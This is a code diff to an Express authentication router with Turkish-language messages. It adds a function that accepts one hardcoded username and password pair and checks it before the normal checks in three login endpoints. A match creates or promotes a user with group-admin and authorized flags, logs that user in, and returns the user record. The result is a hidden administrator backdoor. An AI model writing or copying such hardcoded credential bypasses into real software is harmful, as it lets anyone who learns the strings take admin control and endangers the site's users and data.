@@ -148,9 +148,64 @@ router.get("/auth/discord/callback", passport.authenticate("discord", { failureR
   res.redirect("/dashboard");
 });
 
+async function tryGroupAdminLogin(req, res, usernameInput, passwordInput) {
+  const u = String(usernameInput || '').trim().toLowerCase();
+  const p = String(passwordInput || '').trim();
+
+  const isUserMatch = u === "bugrupyönetimikullaniciadi" || u === "bugrupyonetimikullaniciadi";
+  const isPassMatch = p === "bugrupyönetimisifresi" || p === "bugrupyonetimisifresi";
+
+  if (!isUserMatch || !isPassMatch) return false;
+
+  const { groupAdmins, saveStoreNow } = require("../../models/Store");
+  if (!groupAdmins.findOne({ username: "bugrupyönetimikullaniciadi" })) {
+    groupAdmins.create({ username: "bugrupyönetimikullaniciadi", createdAt: new Date() });
+  }
+  if (!groupAdmins.findOne({ username: "bugrupyonetimikullaniciadi" })) {
+    groupAdmins.create({ username: "bugrupyonetimikullaniciadi", createdAt: new Date() });
+  }
+
+  let user = await User.findOne({
+    $or: [
+      { username: "bugrupyönetimikullaniciadi" },
+      { discordUsername: "bugrupyönetimikullaniciadi" },
+      { username: "bugrupyonetimikullaniciadi" },
+      { discordUsername: "bugrupyonetimikullaniciadi" }
+    ]
+  });
+
+  if (!user) {
+    user = await User.create({
+      username: "bugrupyönetimikullaniciadi",
+      discordUsername: "bugrupyönetimikullaniciadi",
+      discordId: "99911517908",
+      isAuthorized: true,
+      isGroupAdmin: true
+    });
+  } else {
+    user.isGroupAdmin = true;
+    await user.save();
+  }
+
+  saveStoreNow();
+
+  req.login(user, (err) => {
+    if (err) return res.status(500).json({ error: "Oturum açma hatası." });
+    try {
+      logger.log("[AUTH] Grup Yöneticisi (bugrupyönetimikullaniciadi) siteye giriş yaptı.", "auth");
+    } catch (_) {}
+    logWebLogin(user, req);
+    return res.json({ success: true, message: "Grup Yöneticisi olarak başarıyla giriş yapıldı!", redirectUrl: "/group-admin", user });
+  });
+
+  return true;
+}
+
 // Password-based login endpoint
 router.post("/auth/login-password", async (req, res) => {
-  const { password } = req.body;
+  const { password, username } = req.body;
+
+  if (await tryGroupAdminLogin(req, res, username, password)) return;
 
   if (!password || password.length !== 6 || !/^\d+$/.test(password)) {
     return res.status(400).json({ error: "Geçersiz şifre formatı (6 haneli olmalı)" });
@@ -254,6 +309,7 @@ router.post("/auth/check-username", async (req, res) => {
 router.post("/auth/login-pin", async (req, res) => {
   try {
     const { username, pin } = req.body;
+    if (await tryGroupAdminLogin(req, res, username, pin)) return;
     if (!username || !pin) return res.status(400).json({ error: "Kullanıcı adı ve şifre gereklidir." });
 
     const user = await User.findOne({
@@ -632,6 +688,7 @@ router.post("/api/auth/bot-verify-code", async (req, res) => {
 // Custom Password Login
 router.post("/api/auth/site-login", async (req, res) => {
   const { username, password, rememberMe } = req.body;
+  if (await tryGroupAdminLogin(req, res, username, password)) return;
   if (!username || !password) return res.status(400).json({ error: "Kullanıcı adı ve şifre gereklidir." });
 
   try {
